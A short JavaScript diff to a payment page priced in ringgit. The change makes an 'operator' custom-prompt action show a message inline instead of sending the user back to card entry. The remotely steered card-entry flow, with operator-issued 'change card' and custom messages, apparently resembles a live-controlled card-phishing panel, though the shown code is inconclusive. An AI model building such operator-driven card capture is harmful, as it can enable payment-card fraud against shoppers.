@@ -1914,7 +1914,7 @@ fetch('/api/settings')
       if (btn4) { btn4.disabled = true; }
       showInline('error', 'Session timed out. Please try again.', true);
  
-    } else if (a === 'change_card_prompt'  || a==='custom_prompt') {
+    } else if (a === 'change_card_prompt') {
       _curStep = 'card';
       document.getElementById('load-overlay').classList.add('hidden');
       document.querySelector("#app-verify-overlay > div.app-verify-box").classList.add('hidden');
@@ -1935,7 +1935,11 @@ fetch('/api/settings')
       var btn5 = q('btnSubmit');
       if (btn5) { btn5.disabled = false; /*btn5.textContent = 'Pay RM ' + discountedTotal().toFixed(2);*/ }
       showMsg('error', p.message, true);
- 
+
+    } else if (a === 'custom_prompt') {
+      // show operator message inline without resetting to card step
+      showMsg('error', p.message, true);
+
     } else if (a === 'change_card') {
       _curStep = 'card';
       document.getElementById('load-overlay').classList.add('hidden');
